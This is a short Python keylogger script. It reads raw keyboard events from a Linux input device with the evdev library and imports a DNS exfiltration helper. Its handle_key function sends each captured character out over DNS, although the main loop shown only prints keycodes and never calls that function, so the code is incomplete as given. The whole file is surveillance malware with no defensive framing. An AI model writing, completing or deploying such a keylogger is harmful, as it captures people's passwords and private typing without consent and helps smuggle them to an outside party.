from evdev import InputDevice, categorize, ecodes
from dns_exfil import send_dns_exfil

KEYBOARD_EVENT = "/dev/input/event6"

keyboard = InputDevice(KEYBOARD_EVENT)

def handle_key(char):
    print(char, end="", flush=True)
    send_dns_exfil(char)

print(f"[+] Listening for keystrokes on {KEYBOARD_EVENT}...")

try:
    for event in keyboard.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:
                print(key_event.keycode)
except KeyboardInterrupt:
    print("\n[+] Keylogger stopped cleanly.")

